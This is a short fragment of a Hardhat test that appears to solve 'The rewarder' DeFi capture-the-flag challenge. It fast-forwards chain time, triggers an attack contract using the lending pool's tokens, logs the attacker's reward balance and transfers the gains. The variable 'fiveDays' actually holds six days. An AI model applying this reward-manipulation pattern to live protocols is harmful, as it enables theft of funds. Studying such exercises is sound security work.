...
describe("[Challenge] The rewarder", function () {
	...
	it("Exploit", async function () {
		...
		const fiveDays = 6 * 24 * 60 * 60;

		await ethers.provider.send("evm_increaseTime", [fiveDays]);
		await ethers.provider.send("evm_mine");

		this.receiver.attack(TOKENS_IN_LENDER_POOL);


		console.log((await this.rewardToken.balanceOf(attacker.address)).toString());

		await this.receiver.transfer();
	});
